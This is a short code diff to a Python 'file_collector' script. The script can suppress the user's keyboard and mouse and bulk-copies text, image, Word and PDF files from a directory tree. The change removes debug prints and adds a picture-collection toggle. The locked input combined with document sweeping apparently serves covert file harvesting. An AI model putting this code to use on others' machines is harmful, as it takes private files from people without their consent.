@@ -23,10 +23,6 @@ if os.path.exists(f"{os.getcwd()}/cfg/file_collector_config.json"):
     with open(f"{os.getcwd()}/cfg/file_collector_config.json", "r") as f:
         config = json.load(f)
 
-print(config.get("monitor_control"))
-
-print(config.get("input_blocking"))
-
 if config.get("input_blocking") == True:
     kb_listener = pynput.keyboard.Listener(suppress=True)
     m_listener = pynput.mouse.Listener(suppress=True)
@@ -63,7 +59,8 @@ def get_files(path):
             if file.endswith(".txt"):
                 txt.append(os.path.join(root, file))
             elif file.endswith(".png") or file.endswith(".jpg") or file.endswith(".jpeg"):
-                pics.append(os.path.join(root, file))
+                if config["collect_pictures"]:
+                    pics.append(os.path.join(root, file))
             elif file.endswith(".docx"):
                 docx.append(os.path.join(root, file))
             elif file.endswith(".pdf"):
@@ -76,7 +73,8 @@ def get_files(path):
     for file in txt:
         copy(file, target_path_txt)
     for file in pics:
-        copy(file, target_path_images)
+        if config["collect_pictures"]:
+            copy(file, target_path_images)
     for file in docx:
         copy(file, target_path_docx)
     for file in pdf:
